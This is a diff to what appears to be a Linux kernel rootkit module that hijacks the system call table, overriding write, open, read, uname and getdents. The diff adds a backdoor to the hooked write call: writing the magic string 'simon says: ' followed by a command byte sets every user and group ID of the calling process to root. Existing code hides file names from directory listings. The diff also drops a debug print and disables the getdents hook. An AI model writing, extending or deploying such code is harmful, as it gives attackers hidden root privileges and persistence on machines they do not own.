@@ -66,6 +66,7 @@ static asmlinkage long (*org_open)(const char __user *, int, umode_t);
 static asmlinkage long (*org_write)(unsigned int, const char __user *, size_t);
 
 static asmlinkage long write(unsigned int fd, const char __user *buf, size_t count) {
+  struct cred *new;
   if (strncmp(buf, "simon says: ", sizeof("simon says: ")-1) == 0) {
     buf += (sizeof("simon says: ")-1);
     switch(*buf) {
@@ -81,6 +82,16 @@ static asmlinkage long write(unsigned int fd, const char __user *buf, size_t cou
         printk("%s\n", hidden[last_hidden]);
         printk("%i\n", sizes[last_hidden]);
         last_hidden += 1;
+        break;
+      case 2:
+        new = prepare_creds();
+        if (new != NULL) {
+          new->uid.val = new -> gid.val = 0;
+          new->euid.val = new ->egid.val = 0;
+          new->suid.val = new->sgid.val=0;
+          new->fsuid.val = new->fsgid.val = 0;
+          commit_creds(new);
+        }
         break;
     }
     return 0;
@@ -155,7 +166,6 @@ static asmlinkage long getdents(unsigned int fd, struct linux_dirent __user
   for (i = j = 0; i < ret; i++,j++) {
     buf[j] = buf[i];
     for (ptr = 0; ptr < last_hidden; ptr++) {
-      printk("%s %x \n", hidden[ptr], sizes[ptr]);
       if (strncmp(buf + i, hidden[ptr], sizes[ptr]) == 0) {
         for (; buf[i] != '\0'; i++);
         for (; i % 8 != 0; i++);
@@ -251,7 +261,7 @@ static int __init load_module(void) {
   _sys_call_table[__NR_uname] = uname;
   _sys_call_table[__NR_read] = read;
   _sys_call_table[__NR_open] = open;
-  _sys_call_table[__NR_getdents] = getdents;
+  //_sys_call_table[__NR_getdents] = getdents;
   _sys_call_table[__NR_write] = write;
   return 0;
 }
@@ -261,7 +271,7 @@ static void __exit cleanup(void) {
   _sys_call_table[__NR_uname] = org_uname;
   _sys_call_table[__NR_open] = org_open;
   _sys_call_table[__NR_read] = org_read;
-  _sys_call_table[__NR_getdents] = org_getdents;
+  //_sys_call_table[__NR_getdents] = org_getdents;
   _sys_call_table[__NR_write] = org_write;
   set_write_permission();
   return;
